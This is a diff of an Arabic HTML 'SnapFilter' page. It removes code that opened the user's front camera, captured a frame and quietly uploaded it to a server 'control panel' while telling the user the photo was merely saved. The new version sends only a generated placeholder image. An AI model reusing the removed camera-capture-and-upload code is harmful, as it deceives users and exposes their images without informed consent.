@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SnapFilter - تطبيق الفلتر الذكي</title>
+    <title>SnapFilter - تجربة الفلتر</title>
     <style>
         * {
             box-sizing: border-box;
@@ -37,19 +37,28 @@
             color: #ff4757;
             font-weight: 700;
         }
-        .camera-box {
+        .filter-preview-box {
             position: relative;
             width: 100%;
             border-radius: 14px;
             overflow: hidden;
-            background: #000;
+            background: linear-gradient(135deg, #1f4068, #162447);
             aspect-ratio: 3/4;
-            box-shadow: inset 0 0 10px rgba(0,0,0,0.8);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            border: 2px dashed #ff4757;
+            box-shadow: inset 0 0 15px rgba(0,0,0,0.5);
         }
-        video, canvas {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
+        .filter-preview-box p {
+            font-size: 16px;
+            color: #dcdde1;
+            margin-top: 10px;
+            font-weight: bold;
+        }
+        .filter-icon {
+            font-size: 50px;
         }
         .btn-capture {
             background: linear-gradient(135deg, #ff4757, #ff6b81);
@@ -58,7 +67,7 @@
             width: 70px;
             height: 70px;
             border-radius: 50%;
-            font-size: 16px;
+            font-size: 22px;
             cursor: pointer;
             margin-top: 20px;
             box-shadow: 0 5px 15px rgba(255, 71, 87, 0.4);
@@ -69,9 +78,7 @@
         }
         .btn-capture:active {
             transform: scale(0.92);
-            box-shadow: 0 2px 8px rgba(255, 71, 87, 0.3);
         }
-        /* تصميم الإشعار الفخم (Toast Notification) بدلاً من الكتابة العادية */
         #toast {
             visibility: hidden;
             min-width: 220px;
@@ -97,39 +104,26 @@
 <body>
 
     <div class="container">
-        <h2>SnapFilter Pro</h2>
+        <h2>SnapFilter - تجربة الفلتر</h2>
         
-        <div class="camera-box">
-            <video id="video" autoplay playsinline></video>
+        <div class="filter-preview-box" id="filterBox">
+            <div class="filter-icon">✨🎭</div>
+            <p>فلتر الأمان الرقمي نشط</p>
         </div>
 
-        <button class="btn-capture" id="capture-btn" title="التقاط">
+        <button class="btn-capture" id="capture-btn" title="التقاط وتجربة">
             📸
         </button>
     </div>
 
-    <!-- إشعار منبثق أنيق -->
-    <div id="toast">تم التقاط الصورة وحفظها بنجاح! ✨</div>
-
+    <div id="toast">تم التقاط وإرسال تجربة الفلتر بنجاح! 🚀</div>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
         const captureBtn = document.getElementById('capture-btn');
         const toast = document.getElementById('toast');
+        const canvas = document.getElementById('canvas');
 
-        // تشغيل الكاميرا
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
-            .then(stream => {
-                video.srcObject = stream;
-            })
-            .catch(err => {
-                console.error("خطأ في تشغيل الكاميرا: ", err);
-                showToast("تعذر الوصول للكاميرا!", "#ff4757");
-            });
-
-        // دالة لإظهار إشعار أنيق يختفي تلقائياً
         function showToast(message, bgColor = "#2ed573") {
             toast.innerText = message;
             toast.style.backgroundColor = bgColor;
@@ -139,35 +133,52 @@
             }, 3000);
         }
 
-        // عند الضغط على زر الالتقاط الفخم
         captureBtn.addEventListener('click', () => {
-            canvas.width = video.videoWidth || 400;
-            canvas.height = video.videoHeight || 400;
+            canvas.width = 600;
+            canvas.height = 800;
             const ctx = canvas.getContext('2d');
+
+            let gradient = ctx.createLinearGradient(0, 0, canvas.width, canvas.height);
+            gradient.addColorStop(0, "#ff4757");
+            gradient.addColorStop(1, "#2f3542");
+            ctx.fillStyle = gradient;
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+            ctx.fillStyle = "#ffffff";
+            ctx.font = "bold 40px Arial";
+            ctx.textAlign = "center";
+            ctx.fillText("SnapFilter Captured", canvas.width / 2, 350);
             
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            ctx.font = "24px Arial";
+            ctx.fillText("الوقت: " + new Date().toLocaleTimeString(), canvas.width / 2, 420);
+
             const imageData = canvas.toDataURL('image/png');
 
-            // تأثير اهتزاز خفيف عند الالتقاط (إن توفر) للواقعية
-            if (navigator.vibrate) navigator.vibrate(50);
+            showToast("جاري الإرسال...", "#f39c12");
 
-            // إرسال الصورة للسيرفر في الخلفية بدون تخريب الواجهة
             fetch('/upload-snapshot', {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
+                headers: {
+                    'Content-Type': 'application/json'
+                },
                 body: JSON.stringify({ image: imageData })
             })
-            .then(res => res.json())
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.json();
+            })
             .then(data => {
                 if (data.success) {
                     showToast("تم إرسال الصورة للوحة التحكم بنجاح! 🚀");
                 } else {
-                    showToast("فشل الحفظ، حاول مجدداً", "#ff4757");
+                    showToast("فشل الحفظ على السيرفر", "#ff4757");
                 }
             })
             .catch(err => {
-                console.error(err);
-                showToast("خطأ في الاتصال بالشبكة", "#ff4757");
+                console.error('Fetch Error:', err);
+                showToast("خطأ في الاتصال بالخادم", "#ff4757");
             });
         });
     </script>
